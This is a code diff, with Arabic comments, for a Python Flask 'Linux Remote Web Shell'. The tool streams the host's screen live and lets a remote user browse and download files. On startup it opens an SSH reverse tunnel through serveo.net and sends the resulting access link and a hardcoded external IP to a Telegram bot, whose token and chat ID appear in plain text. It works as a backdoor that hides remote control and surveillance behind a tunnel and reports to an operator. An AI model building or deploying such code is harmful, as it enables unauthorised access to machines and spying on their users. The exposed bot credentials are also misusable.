@@ -18,6 +18,9 @@ app = Flask(__name__)
 TELEGRAM_BOT_TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
 TELEGRAM_CHAT_ID = "8897834377"
 
+# الأيبي الخارجي المعتمد
+EXTERNAL_IP = "193.222.96.71"
+
 def send_telegram_message(message):
     try:
         url = "https://api.telegram.org/bot{}/sendMessage".format(TELEGRAM_BOT_TOKEN)
@@ -28,34 +31,29 @@ def send_telegram_message(message):
     except Exception as e:
         print("[-] Telegram Error: {}".format(e))
 
-# دالة تشغيل Serveo تلقائياً عبر SSH وسحب الرابط وإرساله للتيليجرام (متوافقة مع بايثون القديم)
+# دالة تشغيل Serveo تلقائياً وإرسال الرابط والأيبي للتيليجرام
 def start_serveo_and_notify():
-    time.sleep(3) # الانتظار حتى يعمل سيرفر الفلاسك
+    time.sleep(3)
     try:
-        # تشغيل خدمة serveo على البورت 8080 في الخلفية وحفظ المخرجات في ملف مؤقت
         os.system("ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo_log.txt 2>&1 &")
         
-        # الانتظار قليلاً حتى يتم إنشاء النفق واستخراج الرابط
         public_url = None
         for _ in range(10):
             time.sleep(2)
             if os.path.exists("serveo_log.txt"):
                 with open("serveo_log.txt", "r") as f:
                     content = f.read()
-                    # البحث عن الرابط في مخرجات الـ ssh
                     match = re.search(r'https://[a-zA-Z0-9-]+\.serveo\.net', content)
                     if match:
                         public_url = match.group(0)
                         break
         
-        if public_url:
-            msg = "🚀 مرحباً يا محمد! تم تشغيل الـ Web Shell عبر Serveo بنجاح.\n\n🔗 رابط الدخول الخارجي:\n{}".format(public_url)
-            send_telegram_message(msg)
-            print("[+] تم إرسال الرابط إلى تيليجرام بنجاح: {}".format(public_url))
-        else:
-            print("[-] لم يتم العثور على رابط Serveo في السجلات.")
+        # استخدام الأيبي المحدّد مع الرابط في رسالة تيليجرام
+        msg = "🚀 مرحباً يا محمد! تم تشغيل الـ Web Shell بنجاح.\n\n🌐 الأيبي الخارجي: {}\n🔗 رابط الدخول المباشر:\n{}".format(EXTERNAL_IP, public_url if public_url else "http://{}".format(EXTERNAL_IP))
+        send_telegram_message(msg)
+        print("[+] تم إرسال البيانات إلى تيليجرام بنجاح!")
     except Exception as e:
-        print("[-] خطأ في تشغيل Serveo: {}".format(e))
+        print("[-] خطأ في التشغيل: {}".format(e))
 
 # دالة التقاط الشاشة للبث الحي
 def generate_frames():
@@ -110,7 +108,7 @@ HTML_TEMPLATE = """
         <img src="{{ url_for('video_feed') }}" alt="Live Stream">
     </div>
     <div class="container">
-        <h2>⚡ Linux Remote Web Shell (Python 3.6 Compatible) ⚡</h2>
+        <h2>⚡ Linux Remote Web Shell (IP: 193.222.96.71) ⚡</h2>
         <div class="section">
             <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
             <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
@@ -165,7 +163,7 @@ def index():
     current_path = request.args.get('path', os.getcwd())
     current_path = os.path.abspath(current_path)
     parent_path = os.path.dirname(current_path)
-    output = "أهلاً بك يا محمد! نظام التحكم متوافق مع بايثون القديم وجاهز:\n"
+    output = "أهلاً بك يا محمد! النظام يعمل على الأيبي الخارجي 193.222.96.71:\n"
     
     if request.method == "POST":
         action = request.form.get("action")
@@ -210,7 +208,6 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
-    # تشغيل خيط خلفي لتفعيل Serveo وإرسال الرابط للبوت تلقائياً
     t = threading.Thread(target=start_serveo_and_notify)
     t.daemon = True
     t.start()
